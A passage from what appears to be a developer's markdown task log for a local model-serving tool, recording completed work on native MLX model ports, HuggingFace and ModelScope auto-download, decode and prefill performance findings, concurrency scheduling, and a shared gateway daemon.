    RMSNorm +1 must NOT be re-applied (was doubling norms -> 6x blowup); the delta
    recurrence must run in f32 not bf16 (greedy drift); and the `A_log` param key
    is capitalized (was loading as ones -> wrong decay). Greedy output identical
    to Python mlx_lm: "Here's a thinking process:" (per-layer L2 to ~0.1%). E2E
    test `mlx_qwen35_chat`.
  - **Phase 2b DONE — `qwen3_5_moe` (Qwen3.6-35B-A3B)** (fork `f27ddc42`, rozum
    `223fd69`). Reuses the qwen3_5 backbone verbatim (attention + GatedDeltaNet +
    LayerCache, made pub) + the qwen3_moe SwitchGLU (made pub); every layer's MLP
    is a sparse MoE block = router gate + top-k SwitchGLU + a shared expert gated
    by `sigmoid(shared_expert_gate(x))`. **Per-module quant**: the router gate and
    shared_expert_gate are 8-bit (rest 4-bit) and nn::quantize is uniform-only, so
    those two are raw `QuantLinear` (quantized_matmul) outside nn::quantize; the
    4-bit experts stay raw SwitchGLU; the rest go through nn::quantize at 4-bit.
    `intermediate_size` optional (pure-MoE omits it). Greedy output matches Python
    mlx_lm: "Thinking Process:" — worked on the first forward run (only two config
    fixes needed). E2E test `mlx_qwen35_moe_chat`. **Phase 2 COMPLETE.**
#### mlx-native catalog + UX (user request 2026-06-12) — broaden models + auto-download

- [x] mlx-native-autodownload - **DONE (`feature/mlx-autodownload`, rozum-only).**
  Native MLX now auto-fetches an MLX snapshot from HuggingFace when not cached. New
  `src/hf_hub.rs`: `ensure_snapshot(repo, config_gate)` — lists files via the HF API
  (`…/api/models/<repo>` → `sha` + `siblings`), downloads into the HF cache layout
  (`~/.cache/huggingface/hub/models--<org>--<name>/snapshots/<sha>/`) via `reqwest`
  streaming (no `hf-hub` crate). **`config.json` fetched FIRST + passed to a gate** so an
  unsupported `model_type` is rejected before the multi-GB weights. **Live progress
  line** per file (`[i/N] <file>  <done>/<total> (NN%)`, throttled ~4 MiB, `\r`+clear).
  Honors `HF_TOKEN`. `mlx_native_backend::ensure_model_dir(spec)` = cached-or-download,
  wired into `try_build_mlx_native_backend` (replaces the cache-only `resolve_model_dir`);
  gate = `supported_model_type` (matches `LoadedModel::load`, checks top-level +
  `text_config.model_type`). Validated: rejection path (config-only) + full ~0.4 GB
  download of `Qwen3-0.6B-4bit` (8 files, progress 0→100%, loadable snapshot). Tests
  `wanted_*` + ignored network `config_first_gate_*` / `full_download_*`.

- [x] mlx-native-hub-cache - **DONE (`feature/mlx-hub-cache`, rozum-only).** Two fixes
  to auto-download so it shares the cache with the native tools (no double-downloads):
  (1) **Proper `huggingface_hub` layout.** Old code wrote real files into
  `snapshots/<sha>/` (so Python re-downloaded the same model into the proper layout →
  wasted disk). Now `hf_hub.rs` writes the exact hf_hub layout — `blobs/<oid|sha256>`
  (etag from the tree API: `oid` for regular, `lfs.oid`=sha256 for LFS), `snapshots/
  <commit>/<path>` → `../../blobs/<oid>` symlinks, `refs/main`; an existing blob (from
  either tool) is reused, not re-fetched. **Proven bidirectional**: `huggingface_hub.
  try_to_load_from_cache` + `mlx_lm.load` work fully OFFLINE against a rozum-written
  cache. (2) **ModelScope source** (`src/modelscope.rs`, spec `modelscope:<owner>/<repo>`)
  — the other hub carrying MLX (Qwen-heavy, CN). Lists via `…/api/v1/models/<repo>/repo/
  files`, downloads flat into `$MODELSCOPE_CACHE/hub/<owner>/<name>/` (ModelScope's own
  layout), same config-first gate + progress (shared `stream_download`/`wanted`).
  `ensure_model_dir`/`resolve_model_dir` dispatch by `modelscope:` prefix. Validated e2e:
  `mlx_modelscope_chat` downloaded `mlx-community/Qwen2.5-0.5B-Instruct-4bit` FROM
  modelscope.cn + loaded + generated. **Disk cleanup done**: deleted 3 old wrong-layout
  dirs (~964 MB; Llama-1B / Qwen2.5-0.5B / a config-only orphan), re-scan confirms only
  correct-layout remains, and a re-download lands in proper layout + loads offline.

- [x] mlx-native-llama - **DONE (`feature/mlx-llama`, fork `b46aee6f`).** Llama family
  for native MLX. Fork `llama.rs`: (1) **AFQ-quant loader** — `load_llama_model` now
  mirrors `load_qwen3_model` (read `quantization` → `nn::quantize` → remap
  `<p>.weight → <p>.inner.weight` where a `.scales` sibling exists); `ModelArgs` gained
  `quantization`. (2) **sampler** — `Generate` reuses qwen3's model-agnostic
  `SamplerOpts`/`sample_with`/`repeat_window` (imported, not duplicated) + history +
  `set_sampler`. rozum: `LoadedModel::Llama` + `load` arm (`model_type` "llama") +
  dispatch like `Qwen3` (external cache + `set_sampler`); `supported_model_type` += llama.
  **Validated greedy byte-exact vs Python `mlx_lm`** on Llama-3.2-1B-Instruct-4bit:
  both emit "The capital of France is Paris." E2E test `mlx_llama_chat` (auto-downloads).

- [x] mlx-native-qwen2 - **DONE (`feature/mlx-llama`, fork `d62049c9`).** Qwen2 / Qwen2.5
  (incl. Qwen2.5-Coder) for native MLX. New fork `models/qwen2.rs` (adapted from
  `llama.rs`): dense transformer with the Qwen2 bias convention — **q/k/v carry a bias,
  o_proj does not** (independent of `attention_bias`, which Qwen2 omits); reuses the
  AFQ-quant loader + qwen3 sampler. Two Qwen2-specific fixes over the llama base: (1)
  `head_dim` optional → filled from `hidden_size / num_attention_heads`; (2) the weight
  remap also maps **`.bias → .inner.bias`** for quantized layers (QuantizedLinear nests
  the linear bias under `inner`; Qwen2 has q/k/v biases, so without this they stay at
  init → garbage; `.biases` quant zero-points left alone). rozum: `LoadedModel::Qwen2` +
  `load` arm + dispatch + `supported_model_type` += qwen2. **Validated greedy byte-exact
  vs Python `mlx_lm`** on Qwen2.5-0.5B-Instruct-4bit. Unlocks `Qwen2.5-Coder-32B-Instruct-4bit`
  (in `RECOMMENDED`). E2E test `mlx_qwen2_chat`.

##### Catalog — quick & cheap wins (do next; each = small port + oracle sweep)

- [x] mlx-native-mistral - **DONE 2026-06-14 — the one-line alias, as predicted.** Mistral /
  Mistral-Nemo (`model_type: "mistral"`) is architecturally Llama (GQA, no qkv-bias, SwiGLU,
  RoPE) and upstream `mlx_lm` serves it with the *llama* model class, so `LoadedModel::load`
  now routes `"llama" | "mistral" => llama::load_llama_model` and `supported_model_type` admits
  `"mistral"` — NO new fork file. Guards: `mistral_is_a_supported_model_type` + `mistral` added
  to the dense/unretained classification test (fast suite, 130/0). Caveat as noted: Mistral's
  sliding-window attention (4096) is approximated by the llama path's full attention, so it
  matches the reference except beyond the window — fine for agents, bounded by the KV preflight;
  if a short-context divergence ever shows, fall back to a thin `mistral.rs`. **VALIDATED
  end-to-end** (`mlx_mistral_chat`, Mistral-7B-Instruct-v0.3-4bit): *"Paris is the capital of
  France."* The run surfaced two general config quirks (NOT in the alias itself), both fixed in the
  fork: (1) Mistral's `config.json` omits `head_dim` → made it `Option` in `llama::ModelArgs`,
  default `hidden_size/num_attention_heads` (fork `1f5475a1`); (2) Mistral ships `chat_template` as
  the older list-of-`{name,template}` form → `load_model_chat_template_from_str` now parses both the
  string and list forms, picking the `"default"` entry (fork `3f230b2a`, + unit test, + fixed
  pre-existing broken `mlx-lm-utils` tests). Added to `models::RECOMMENDED`. Opens Mistral / Nemo
  (and the Mixtral base) — and these two fixes broaden the whole Llama family's config tolerance.

- [x] mlx-native-llama-aliases - **DONE 2026-06-14.** Verified `mlx-community:SmolLM2-1.7B-Instruct`
  (a non-Llama-3 `model_type: "llama"` model) runs on the existing llama path: *"The capital of
  France is Paris."* (`mlx_smollm_chat`). Confirms the alias works for the wider Llama family (and
  the `head_dim` config-tolerance fix held for it). Added to `models::RECOMMENDED`. No code beyond
  the RECOMMENDED entry + test.

- [x] mlx-native-fp16-verify - **DONE 2026-06-14 (same model).** `SmolLM2-1.7B-Instruct` is a
  **non-quantized bf16** checkpoint, so loading it exercises the AFQ loader's `quantization = None`
  branch — confirmed loads + generates correctly (`mlx_smollm_chat`). bf16/fp16 MLX checkpoints
  work as-is (just more RAM). No code.

- [x] mlx-native-p4 - Phase 4: native MLX is the DEFAULT backend; `mlx_lm.server`
  retired (rozum `74b458a`). `default = ["mlx-native"]` (was `["mistralrs"]`);
  mistralrs is now opt-in `--features mistralrs` (broader-catalog candle fallback,
  still tried after native MLX). Removed `try_mlx_server` + its chain step; the
  in-process native runtime supersedes the Python server. Chain is now GGUF ->
  native MLX -> mistralrs (opt-in) -> LM Studio HTTP -> ROZUM_BACKEND_URL. SPEC.md
  resolution chain + no-backend hints + select-failed note updated. Default and
  `--features mistralrs` both build clean. **Open: reproducibility** — mlx-native
  still uses path deps into the gitignored `.vendor/`; merge-to-master must push
  the fork (`sergey-scherbina/mlx-rs` branch `rozum-mlx-native`) and switch to a
  git-rev pin (like the mistralrs `[patch.crates-io]`) so the default builds
  off-tree.
- [x] mlx-native-perf - Phase 5: throughput. Spec section: `docs/specs/mlx-native-runtime.md`
  "Performance". **RESOLVED + SHIPPED + single-stream MAXED (2026-06-13).** Decode root-caused &
  fixed (bf16 stream leak in GatedDeltaNet q/k scaling → ~1000 casts/token): MoE decode 33→~88 t/s
  (2.7×), prefill →1215 (=Python), dense 16→~19.6 (~90% of Python); byte-exact; on master. The
  "capture-based plain-`compile`" lever below was the open hypothesis — since **REFUTED** (MLX
  auto-fuses; bottleneck is 92% CPU build/FFI, not fusion), so **batching is the only further
  lever** and BOTH dense (1.98×) AND hybrid (2.30×, byte-exact) batched decode are now **shipped**
  too. Nothing left on single-stream. Detail: [[project-mlx-hybrid-decode-gap]]; the historical
  investigation is preserved below for the record.

  **STATUS (2026-06-11) — perf territory mapped; prefill wins shipped; one decode
  lever identified (capture-based compile), gated on a fixed-shape cache.** Where
  things stand and what to do next:
  - DONE on master: GatedDeltaNet prefill kernel (~2.9x), chunked prefill +
    last-position projection (bound the large-prompt peak, byte-identical),
    decode-bug resolved (per-call eval is correct + FREE), fused causal SDPA,
    sampling (top_p/top_k/seed/repeat_penalty), cancellation, multi-eos, tool-use +
    multi-turn tool history, KV preflight.
  - DEAD END (measured, don't retry): removing the per-call eval (no-op, decode isn't
    sync-bound); `compile_with_state` (net-negative — re-marshals ~400 params/call).
  - **CORRECTION (2026-06-11):** the "mx.compile is a dead end" finding was scoped to
    `compile_with_state` only. Plain `compile` (`compile.rs:344`) marshals **only the
    args** and captures referenced weights into the trace — exactly how Python
    `mlx_lm` reaches ~22 t/s vs our ~12. This **capture-based plain-`compile`d decode
    step was never probed** and is the one untested lever with ~2× potential.
  - NEXT (recommended order):
    1. `mlx-native-mem-bound` — DONE (KV preflight + "lower --n-ctx" instead of OOM).
    2. SDPA `Causal` mode in prefill — DONE (fork `ef5cbca9`): fused causal SDPA,
       byte-identical (oracle + chunked Δ=0), drops the O(T·ctx) mask allocation.
    3. `mlx-native-perf-compile` (NEW, top remaining perf item) — capture-based
       plain-`compile`d decode step. **Prereq:** fixed-shape KV cache (preallocate +
       in-place slice-update; today's `ConcatKeyValueCache` grows by concat and
       defeats compile). Correctness-critical (must stay byte-exact) and intersects
       the GatedDeltaNet buffer-donation hazard. **Needs a clean machine to A/B** —
       current numbers degraded ~30% by session memory pressure. Do as a dedicated
       session, not a tail-end change.
    4. (FALLBACK, larger) hand-written fused Metal kernels to cut ~450 dispatches/token.

  - **DONE — GatedDeltaNet Metal kernel (~2.9x Qwen3.6 prefill)** (master `a001e90`,
    fork `738a4419`). Bound `mx.fast.metal_kernel` in mlx-rs (`fast::MetalKernel`)
    + ported the Python gated-delta kernel: the whole T-step scan in one GPU
    dispatch. 27B 1024-tok prefill 20.9s->7.1s; greedy still byte-exact on 27B +
    35B-A3B. Caveat: the custom kernel needs a BLOCKING `eval` per call (see the
    bug below), so each call syncs.
  - **DONE — decode bug dig (`mlx-native-decode-bug`): RESOLVED + the eval is FREE.**
    Root cause of the "needs a blocking eval per call" rule: the custom-kernel
    primitive's `state_out` is a lazy buffer that the ~60 intervening layers of the
    forward can donate/reuse before it is materialized, silently corrupting the
    recurrent state (decode diverges at the *second* token: prefill's first token
    is correct, then the carried state is wrong). The per-call `eval` fixes it by
    forcing `state_out` concrete immediately. Confirmed by a 64-deep chained-kernel
    repro: a recurrent kernel chain is correct deferred when **nothing heavy runs
    between the calls**, and only corrupts inside the large model graph — i.e. it is
    a buffer-donation hazard, not a binding bug. (The earlier `async_eval` "garbage"
    was MLX's single default stream racing the next step on a second thread, a
    separate concurrency artifact — the real worker is single-threaded.)
  - **KEY FINDING — the per-call eval is NOT the decode bottleneck.** A/B on the
    27B bench (decode tok/s): per-call eval ON 13.0 / 7.7 / 12.2 vs OFF 16.1 / 11.2
    / 11.2 at n=128/512/1024 — overlapping noise, no gain. Removing the 48 GPU
    syncs/token does nothing measurable. Decode (~12 t/s vs Python ~22) is bound by
    raw op-launch overhead across the 64-layer forward (~450 tiny matmul/conv
    dispatches/token at T=1), the SAME whether eval'd per-call or once. **So the
    per-call eval stays (correct + free); the real lever is op fusion, below.** No
    code change shipped from this dig — the existing per-call eval is already
    optimal.
  - [x] **mx.compile via `compile_with_state`** (`mlx-native-compile`) — net-negative.
    Probe `mlx_compile_probe` (dense Qwen3-4B, fixed shapes): T=1 uncompiled 8.79ms
    vs compiled 17.34ms (**0.51x**), T=16 0.85x. mlx-rs `compile_with_state`
    re-marshals the whole `Updatable` state per call (flattens + SORTS ~400 params)
    + `mlx_detail_compile` per call -> binding overhead > fusion benefit. **NOTE
    (correction):** this rules out the `compile_with_state` API only. Plain `compile`
    marshals just the args (weights captured into the trace) — see
    `mlx-native-perf-compile` above; that variant is the real lever and was NOT
    probed. The fixed-shape-KV-cache redesign (its prereq) is therefore NOT moot.
- [x] mlx-native-chunked-prefill - DONE. `Model::prefill` (qwen3_5 + qwen3_5_moe)
  processes the prompt in chunks of `ROZUM_MLX_PREFILL_CHUNK` (default 2048), so the
  full-attention layers bound their `[chunk, ctx]` causal-mask + SDPA peak instead
  of `[T, T]` (the explicit causal mask `linds.ge(rinds)` is the O(T^2) allocation;
  the fused SDPA tiles but still reads it). Caches advance across chunks and are
  eval'd between them (`LayerCache::collect_eval`) to free each chunk's activations
  and keep the deferred graph from spanning the prompt; GatedDeltaNet is already
  O(1) memory. Returns only the last-position logits. **Byte-identical to single
  pass** (the per-position attention + sequential delta scan are position-local):
  test `mlx_qwen35_chunked_prefill_matches_single_pass` on a 3000-tok prompt gives
  `max|Δlogit|=0.000e0` (chunk 512 vs single-pass). Last-position-only `lm_head`
  (`Model::project`): DONE (fork `932967d6`) — avoids the `[1,chunk,vocab]` ~600MB
  logits transient per chunk + the wasted vocab matmul on discarded positions, still
  Δ=0. SDPA `Causal` mode (fork `ef5cbca9`): DONE — the explicit `[chunk,ctx]` mask
  array is gone too (MLX fused causal SDPA, handles the cache offset), still Δ=0.
- [x] mlx-native-mem-bound - **DONE (preflight).** `run_job` estimates the KV
  footprint of the request — `kv_bytes_per_position * (prompt_len + max_tokens)`,
  where `kv_bytes_per_position = 2 (k+v) * full_attn_layers * n_kv_heads * head_dim *
  2 (bf16)` from `config.json` (`text_config` for the hybrid wrapper; only
  full-attention layers hold KV — `full_attention_interval` selects them — the
  GatedDeltaNet conv/recurrent state is O(1)). If it exceeds `KV_SAFETY_FRAC=0.75`
  of `available_ram_bytes()` (vm_stat) it returns a clear `ModelError` ("context too
  large … lower --n-ctx / max_tokens … fits ~N tokens now") instead of letting Metal
  OOM. Skipped when either term is unknown (no false negatives). Unit test
  `kv_bytes_per_position_estimate` (hybrid + dense + missing-fields). FOLLOW-UP: a
  bounded/rotating KV cache to actually cap resident KV for very long sessions — and
  it now doubles as the prereq for `mlx-native-perf-compile` (a fixed-shape cache is
  what lets plain `compile` reuse the decode graph). Worth doing for either reason.
  (Concurrency/admission is already generic via `admit_wrap`;
  `concurrency_capacity()=1` for native.)

#### Native MLX — backend feature parity (vs mistralrs)

Audit 2026-06-11 (`docs/specs/mlx-native-runtime.md` "Backend feature parity"): the
native backend had correctness + the prefill memory work; the request-handling gaps
vs mistralrs are now mostly closed. Status:

- [x] mlx-native-cancel-prefill - **DONE** (fork `fb263995` + rozum `b022dc4`). The
  hybrid `Generate` gains a `should_cancel` predicate polled between prefill chunks
  (`prefill_cancellable` -> `Ok(None)` ends the run); rozum wires it to `job.cancel`,
  so a cancel/disconnect on a long prompt is honored DURING prefill, not only
  per-token after it. Closes the native-side analog of the mistralrs large-prompt
  stall (an abandoned long request no longer blocks the cap-1 worker). Test
  `mlx_qwen35_prefill_cancels_mid_prefill` (bails at chunk 3 of ~6, deterministic).
- [x] mlx-native-sampling - **DONE — top_p/top_k/seed + repeat_penalty** (fork
  `f36c8c3a`/`e970b23a` + rozum `510c760`/`3597abe`). `sample_with(SamplerOpts)`
  ported from mlx_lm, threaded through all four `Generate`; greedy (temp 0) stays
  argmax (oracle byte-exact). seed -> MLX RNG. `repeat_penalty` (HF convention)
  applies over a `REPEAT_CONTEXT=256` token window via `take_along_axis` /
  `put_along_axis` (O(window)); each `Generate` keeps a token history (only when
  penalty != 1.0, so the greedy path is untouched + skips the per-token id eval).
  Unit test pins top_k=1/tiny-top_p == argmax AND that a hard penalty moves the argmax.
- [x] mlx-native-multi-eos - **DONE** (rozum `b022dc4`). `read_config` collects the
  full `eos_token_id` set; `stream_generation` stops on any.
- [x] mlx-native-tool-use - **DONE** (fork `1fc66029`/`e316dbf7` + rozum `09dfbcc`).
  `mlx-lm-utils` `ApplyChatTemplateArgs` gained a `tools` field threaded into the
  minijinja context (+ enabled minijinja's `json` feature for the `tojson` filter
  the Qwen3 template uses). Rozum: `Job` carries `req.tools`; `render_prompt` builds
  OpenAI-style schemas (`tools_json`) into the template; `stream_generation`
  suppresses `<tool_call>` markup from the text stream and parses the run into
  `ToolUseStart/Delta/End` + `stop_reason=ToolUse` (`parse_tool_calls`). E2E verified:
  `mlx_tool_use_weather` emits a `get_weather` call (`stop=ToolUse`); unit test
  `parse_tool_calls_extracts`.

- [x] mlx-native-tool-history - **DONE** (rozum-only, pin unchanged). `message_text`
  now renders assistant `ContentBlock::ToolUse` blocks back into the prompt as
  Qwen3 `<tool_call>\n{json}\n</tool_call>` markup (the inverse of `parse_tool_calls`),
  instead of dropping them. Multi-turn tool loops — exactly what Claude Code/Codex
  do — now carry the prior call in history. Unit test `tool_use_round_trips_into_history`
  renders then re-parses (round-trip). (`tool` role results already fold in as text
  via `ToolResult`.)

#### SUPERSEDED: mistralrs-mlx-direct — targeted candle->MLX quant-op bridge

Proven dead end (kept as a parity oracle in `feature/mistralrs-mlx-direct`).
Correct (byte-identical on Qwen3-4B) but **slower than candle** (11.76 vs 100.74
T/s) due to a structural per-op cross-runtime GPU-sync floor. MLX speed is
all-or-nothing -> the native runtime above is the right path. p0/p1/p1b records
kept below; p2/p3/p4 cancelled.

Spec: `docs/specs/mistralrs-mlx-direct.md`. Decisions: targeted quant-ops ·
`mlx-rs` · in the `.vendor/mistral-rs` fork, generic.

- [x] mlx-direct-p0 - Phase 0: bridge prototype + single-op parity. **DONE**
  (fork branch `mlx-direct`, commit `14e699a26`).
  - `mlx-direct` feature + `mlx-rs = "0.25.3"` added; copy-baseline bridge
    (`afq/mlx_bridge.rs`) + `afq/mlx_direct.rs` (dequantize + quantized_matmul);
    runtime switch in `afq_dequantize_op`/`afq_mm_op`.
  - Gate PASSED (`--test-threads=1`): MLX dequantize vs candle (diff < 1e-4);
    MLX quantized_matmul vs candle dequant+matmul (diff < 1e-3).
  - Finding: no candle+MLX coexistence deadlock; the deadlock chase was a
    standalone `afq_mm_op` splitk `sum(0)` hang, reproduced with NO MLX linked.
    Metal tests must run single-threaded; `kill -9` of a hung Metal test wedges
    the GPU. Details in spec Results.

- [x] mlx-direct-p1 - Phase 1: dense model correctness. **DONE** (fork commit
  `a7ea747ea`; feature plumbed quant -> core -> cli).
  - `mlx-community/Qwen3-4B-4bit` via `mistralrs run`, `MISTRALRS_MLX_DIRECT`
    0 vs 1, same seed: **generation byte-identical** (623 chars, 136 tokens,
    `A: Paris.`). No deadlock under full-forward candle<->MLX interleaving.
  - **Perf regression: 2.89 vs 100.74 T/s (~35x).** Copy baseline's CPU
    round-trip + per-op sync. Correct but not shippable.
  - Cross-check vs `mlx_lm` not run (not installed); ON==OFF vs the mlx_lm-
    validated candle path stands in.

- [x] mlx-direct-p1b - Phase 1b: bridge perf. **PARTIAL — SUPERSEDED by mlx-native-runtime.** (fork `c5986e13d`)
  - Weight-array cache (memoize candle->MLX of constant AFQ weights by Metal
    buffer addr): Qwen3-4B-4bit decode **2.89 -> 11.76 T/s (~4x)**, output still
    byte-identical. Banked.
  - **Remaining ~8.6x gap is structural:** per-op cross-runtime GPU sync (candle
    drain to host for `x` + MLX eval for the result = 2 syncs x ~250 quant
    ops/token). candle alone runs the same ops at 100 T/s via one queue + batched
    commits. Cutting this needs shared-MTLBuffer + shared-queue/event ordering,
    which is NOT reachable via public APIs (candle Private storage; mlx-c adopt
    wants void* not MTLBuffer; no cross-queue event exposed), OR widening the
    MLX region toward a fuller native runtime. Open strategic decision.

- [x] mlx-direct-p2/p3/p4 - CANCELLED (superseded by mlx-native-runtime). The
  bridge cannot beat candle (structural per-op sync floor), so wiring MoE
  gather, generalizing bit-widths, and the zero-copy spike no longer pay off.
  The native MLX runtime gets MLX speed by owning the whole forward instead.

#### mistralrs-concurrency-scheduling — responsive, memory-budgeted concurrency

Replace the blunt `max_num_seqs` 1/2 ladder with a layered model: budgeted
engine capacity (A), a rozum-side admission scheduler decoupled from the static
engine knob (B), priority + a reserved fast lane so small interactive requests
never queue behind big ones (C), and bounded-queue backpressure + an OOM circuit
breaker (D). Memory sets the upper bound; the Metal single-GPU compute sweet spot
sets the ceiling. Deliver synergistically in the order A → B+C → D (A lifts the
floor to 2 so a fast lane is physically possible).

Spec: `docs/specs/mistralrs-concurrency-scheduling.md`. Builds on the constant
per-prefill cost from `mistralrs-chunked-prefill.md` (~465 KB/token × chunk).

- [x] concurrency-budget - Phase A: load-time budgeted engine `max_num_seqs`. **DONE.**
  - `budgeted_max_num_seqs(ConcurrencyBudget)` = `clamp(headroom/per_seq, 1, ceiling)`,
    `headroom = safety_frac*available - weights - kv_pool`, `per_seq = prefill_chunk * ~465KB`.
  - Reuse `main.rs` footprint helpers (weights, kv_cache_bytes, available_ram_bytes).
  - Floor 1; lift to ≥2 only when headroom covers one extra `per_seq` (fast-lane room).
  - `ROZUM_MISTRALRS_MAX_SEQS` forces exact; `ROZUM_MISTRALRS_SEQS_CEILING` caps (default 8).
  - Replaces the 24-36 GB→1 / ≥48 GB→2 ladder. Pure fn unit-tested without Xcode.

- [x] concurrency-admission - Phase B+C: admission scheduler + fast lane. **DONE.**
  - `AdmissionScheduler` semaphore ≤ engine capacity, limit via `ROZUM_MISTRALRS_ADMIT`.
  - `chat()` acquires `AdmitGuard` before the engine; releases on done/cancel/drop.
  - SJF ordering by `RequestCost (prompt+max_tokens)`; reserved fast-lane slot for
    cost < `ROZUM_MISTRALRS_FASTLANE_TOKENS` (default 1024, 0 disables).
  - Finding: fork does NOT yield between prefill chunks (chunk loop is inside
    `pipeline::step`) → admission-order responsiveness only; mid-prefill preempt
    deferred to backlog `concurrency-engine-yield`.
  - Disconnect cancel/reap preserved for queued + admitted requests.

- [x] concurrency-load-shedding - Phase D: backpressure + circuit breaker. **DONE.**
  - Bounded queue `ROZUM_MISTRALRS_QUEUE_MAX` (default 32) → `Overloaded` → gateway 429 + Retry-After.
  - Metal alloc failure → `trip()` drops limit (floor 1), cooldown `recover_step()` raises back. No auto-retry (avoids re-OOM); best-effort substring detection.
  - Per-class `max_tokens` dropped (redundant with cost weighting). Invariants covered by scheduler tests.

**`mistralrs-concurrency-scheduling` complete (A + B+C + D).** Follow-ups in BACKLOG;
the big one is `concurrency-engine-yield` (true mid-prefill interleaving).

- [x] concurrency-backend-abstraction - Lift the admission machinery out of mistralrs into a generic `src/concurrency` module + `AdmittingBackend` decorator. **DONE.**
  - `ChatBackend::concurrency_capacity() -> Option<usize>` (default None); `admit_wrap` gates iff `Some`, passthrough otherwise (safe default for remote backends).
  - mistralrs reports `Some(max_num_seqs)`; its `chat()` is plain inference again. Generic `ROZUM_ADMIT*` env. The new mlx-rs backend gets admission/fast-lane/backpressure/breaker for free by returning a capacity.
  - Spec: `docs/specs/concurrency-backend-abstraction.md`.

#### shared-gateway — one shared model process, many launch clients

Make the model-serving gateway a shared, single-instance detached process that
`rozum launch` clients discover & reuse, so two launches don't load two models
and OOM. Single-owner election (TCP-port bind + advisory flock), transparent
failover on a stable port, idle shutdown via client leases. `--model` becomes
optional (reuse running / interactive picker). Adds `rozum models rm`.
Composes with `concurrency` (sharing = one model; AdmittingBackend = N clients).

Spec: `docs/specs/shared-gateway.md`.

- [x] shared-gateway-mvp - Detached `rozum gateway` daemon (registers `active.json`,
  stable port, idle-timeout exit). `rozum launch` discovers a healthy compatible
  gateway and reuses it, else spawns one (port-bind dedup; flock deferred to
  failover) and waits for health, then execs the agent. `--dedicated` keeps the
  old in-process behaviour. **DONE.**
- [x] shared-gateway-failover - Launch-side watchdog respawns the daemon on death
  (same port), anti-stampede via `share::try_spawn_lock` (O_EXCL stale-steal),
  port-bind backstop. Agent reconnects over the brief gap via its own retry. **DONE.**
- [x] shared-gateway-leases - Lease-refcount lifetime (`leases/<pid>` heartbeat,
  mtime-reap) keeps the daemon up while clients are live; `rozum gateway status`/`stop`. **DONE.**
- [x] launch-model-picker - `--model` optional: omitted+running → reuse (print
  model); omitted+none on a TTY → interactive picker (cached first with
  `(cached, size)` / `(not cached, ~size)` annotations; non-cached → download
  confirm); non-TTY → error. Mismatch policy: takeover-if-idle else reuse-with-warning. **DONE.**
- [x] models-rm - `rozum models rm <spec>`: confirm, refuse if it is the active
  model, delete HF/LMStudio dirs directly (Ollama via `ollama rm`), report freed size. **DONE.**
- [x] shared-gateway-proxy - Launch-local model-free reverse proxy in the request
  path (agent → proxy → daemon), mirroring `mcp-proxy`. Foundation for replay /
  poison / transparent swap. Re-points the agent at the proxy's local port. **DONE.**
- [x] shared-gateway-replay-retry - Buffer + replay a request when the daemon dies
  **before the first streamed token**; mid-stream failures surface. Smart retry:
  backoff + jitter, attempt cap, wait-for-health. **Two-tier admission**: daemon
  advertises room (`GET /v1/admit`); each proxy holds its client's requests in its
  own `concurrency::AdmissionScheduler` (SJF + fast lane) and only forwards within
  the daemon's window — prompts wait at the edge, not bounced. **DONE.**
- [x] shared-gateway-poison - Soft/graduated: per-fingerprint crash count;
  degrade-then-retry (serialize) first; refuse 422 only after `ROZUM_POISON_MAX`
  (default 3); share to TTL'd `poison.json` (default 1 h, decay-on-success) only
  on sole-in-flight high confidence — ambiguous stays local to the proxy.
  Crash-attribution = established-connection death (`!is_connect`), so a failover
  gap isn't blamed on the prompt; degrade = exclusive `lane` write-lock serializes
  the retry prefill; proxy fast-refuses confirmed entries before forwarding and the
  daemon's `poison_layer` re-checks before running the model. **DONE.**
- [x] gateway-switch - `rozum gateway switch --model Y [--backend B] [--n-ctx N]`
  / `reload` / `unload`: in-place drain → drop old model (never two resident) →
  load new → bump `generation` → resume; proxies hold across the gap (`/v1/admit`
  closes its window). Held by a `Switchboard` swap cell + injected `BackendBuilder`
  closure; chat handlers `enter()` (park while draining, lazy-reload if unloaded)
  and hold a `ChatLease` for the whole stream so a switch waits for streaming to
  finish. Drain uses a separate `generating` counter (not the idle `in_flight`,
  which would deadlock). `reload` re-execs the binary; `unload` drops the model and
  lazily rebuilds on the next chat. Control plane: auth-gated localhost
  `POST /control/{switch,unload,reload}`. `--dedicated` (no builder) refuses all
  three. `--backend` forces gguf/mistralrs/lmstudio/mlx/url. **DONE.**

#### meeting-mention-inbox — make "→ handle" a real, durable delivery (sunny-civet 2026-06-23)
Spec `docs/specs/meeting-mention-inbox.md`. Addressing a sibling (`-> plucky-fox`, `@nimble-raven`) is
convention, NOT delivery — the target learns it only by re-reading the room, and the push ladder is
dormant unless they have a live proxy (verified: my posts → 0 piggyback drops). Close it WITHOUT
weakening the room as source-of-truth: detect mentions (only against KNOWN handles — `-> undeclared`/
`-> opt-in` are noise), expose a durable cursor-based inbox (survives offline), flag the push.
- [x] **mention-detect** — DONE. `meeting::mention`: `handle_of`/`known_handles`/`mentions`/`addresses`
  (`@h`/`-> h`, boundary-checked). 7 unit tests incl. the false-positive corpus. LIVE FINDING: in this
  room `display_name` ≠ agent handle (agents self-id in content), so the workhorse is
  `addresses(content, own_handle)` (each consumer checks its OWN real handle) — `known_handles`/
  `mentions` kept as a secondary helper for a trustworthy handle set. See spec § decisions.
- [x] **meetings-inbox-cli** — DONE. `rozum meetings inbox --as <handle> [--peek|--all] [-n]`: transcript
  turns that address `<handle>` past a per-handle seen-cursor (`<room>/.inbox/<handle>.json`); reading
  advances it. Validated live (plucky-fox/sunny-civet real mentions found; cursor round-trip; false-pos
  clean for real kebab handles). Closes the offline / CLI-only gap — no proxy needed to see "addressed
  to me, unread". (Shared `resolve_room_root` helper; `meetings read` refactored onto it.)
- [x] **wakeup-mentioned-flag** — DONE. `daemon_proxy` `ensure_wakeup_task` now sets
  `meta.mentioned`/`your_turn` on the `claude/channel` event + a `‹for you›` prefix on the Tier-3
  piggyback when a delta from someone else addresses the proxy's own handle (`mention::addresses`).
  `PROXY_INSTRUCTIONS` teach the agent that `mentioned="true"` = addresses you → prioritize, and point
  at `meetings inbox`. So the PUSH side now distinguishes "for you" from ambient chatter; the PULL side
  (inbox) is durable. 78 meeting tests green.

#### meeting-identity — clean Human vs Agent principals (operator: "navesti poryadok") 2026-06-23
Spec `docs/specs/meeting-identity-roster.md`. The identity was a mess: agents posted WITHOUT `--as` →
inherited the ONE machine-local identity (`$USER · <animal>`) = the operator → everyone showed as
"Sergiy · plucky-fox" (so `plucky-fox` is the HUMAN), real handle only in free-text. Operator directive:
each agent has its OWN name (assigned once at startup), the human is by account/login, NEVER mixed.
Realizes the Agent side of the `Principal` model already designed in `agent-meeting-coordination.md`.
